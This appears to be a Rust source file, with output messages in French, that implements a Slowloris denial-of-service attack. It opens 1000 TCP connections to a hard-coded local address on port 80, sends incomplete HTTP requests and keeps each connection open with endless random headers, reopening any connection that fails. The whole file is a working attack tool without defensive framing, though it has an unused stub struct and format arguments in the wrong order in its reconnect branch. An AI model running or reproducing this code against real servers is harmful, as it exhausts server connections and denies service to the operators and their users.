use std::io::Write;
use std::net::{SocketAddr, TcpStream};
use std::{thread, time};
use rand::random;

struct Socket {
    ip: String,
    port: u8,
}

impl Socket {
    fn create() {
        //
    }
}

fn main () {

    let addr = "192.168.1.14:80";

    let  nb_sockets: usize = 1000;

    let mut sockets = vec![];

    println!("Création des sockets...");
    for i in 0..nb_sockets {
        let mut s = TcpStream::connect(addr)
            .expect("Impossible de se connecter");
        s.write_all(
            format!(
                "GET /?{} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                random::<i8>(),
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
            ).as_bytes(),
        ).expect("Impossible d'envoyer les informations");

        sockets.push(s);
    }

    println!("Slowloris commence !");
    loop {
        for mut s in &mut sockets {
            match s.write_all(format!("X-a: {}\r\n", random::<i8>()).as_bytes()) {
                Ok(_) => println!("Réussi !"),
                Err(_) => {
                    println!("Erreur : {:?}", s);
                    let mut x = TcpStream::connect(addr)
                        .expect("Impossible de se connecter");
                    x.write_all(
                        format!(
                            "GET /?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                            addr,
                            random::<i8>(),
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
                        ).as_bytes(),
                    ).expect("Impossible d'envoyer les informations");

                    *s = x;
                },
            };
        }
    }
}